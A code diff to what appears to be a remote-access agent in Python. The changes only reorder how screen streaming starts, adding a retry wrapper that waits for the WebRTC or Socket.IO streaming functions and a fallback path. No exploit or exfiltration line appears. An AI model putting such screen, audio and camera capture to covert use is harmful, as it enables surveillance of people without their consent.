@@ -4936,7 +4936,27 @@ def stream_screen(agent_id):
     Uses modern socket.io binary streaming.
     """
     log_message("Starting H.264 screen streaming...")
-    stream_screen_h264_socketio(agent_id)
+    # Prefer smart selection (WebRTC preferred, Socket.IO fallback)
+    try:
+        return stream_screen_webrtc_or_socketio(agent_id)
+    except NameError:
+        # In very early startup, the smart selector may not be defined yet
+        # Fall back to direct H.264 Socket.IO streaming once available
+        try:
+            return stream_screen_h264_socketio(agent_id)
+        except NameError:
+            # Defer a bit and retry to avoid NameError during module initialization
+            start_deadline = time.time() + 5
+            while time.time() < start_deadline:
+                try:
+                    return stream_screen_webrtc_or_socketio(agent_id)
+                except NameError:
+                    try:
+                        return stream_screen_h264_socketio(agent_id)
+                    except NameError:
+                        time.sleep(0.02)
+            log_message("Screen streaming functions not ready; aborting start", "error")
+            return False
 
 # JPEG fallback screen streaming removed - now using H.264 socket.io binary streaming
 
@@ -5287,12 +5307,30 @@ def audio_send_worker(agent_id):
 
 # stream_screen_h264_socketio() is defined later after worker functions (line ~11851)
 
+def _run_screen_stream(agent_id):
+    """Thread target that waits for streaming functions to be defined before starting.
+    Avoids NameError if commands arrive while the module is still initializing.
+    """
+    start_deadline = time.time() + 5
+    while True:
+        try:
+            return stream_screen_webrtc_or_socketio(agent_id)
+        except NameError:
+            # Try direct Socket.IO fallback name while waiting
+            try:
+                return stream_screen_h264_socketio(agent_id)
+            except NameError:
+                if time.time() > start_deadline:
+                    log_message("Screen streaming functions not ready; aborting start", "error")
+                    return False
+                time.sleep(0.02)
+
 def start_streaming(agent_id):
     global STREAMING_ENABLED, STREAM_THREAD
     if not STREAMING_ENABLED:
         STREAMING_ENABLED = True
-        # Use smart streaming that automatically chooses WebRTC or Socket.IO
-        STREAM_THREAD = threading.Thread(target=stream_screen_webrtc_or_socketio, args=(agent_id,))
+        # Use a safe wrapper that defers until functions are defined
+        STREAM_THREAD = threading.Thread(target=_run_screen_stream, args=(agent_id,))
         STREAM_THREAD.daemon = True
         STREAM_THREAD.start()
         log_message("Started smart video streaming (WebRTC preferred, Socket.IO fallback).")
@@ -5556,7 +5594,7 @@ def start_webrtc_streaming(agent_id, enable_screen=True, enable_audio=True, enab
         log_message("WebRTC not available, using fallback Socket.IO streaming", "warning")
         # Fallback to existing Socket.IO streaming
         if enable_screen:
-            stream_screen_h264_socketio(agent_id)
+            start_streaming(agent_id)
         if enable_audio:
             start_audio_streaming(agent_id)
         if enable_camera:
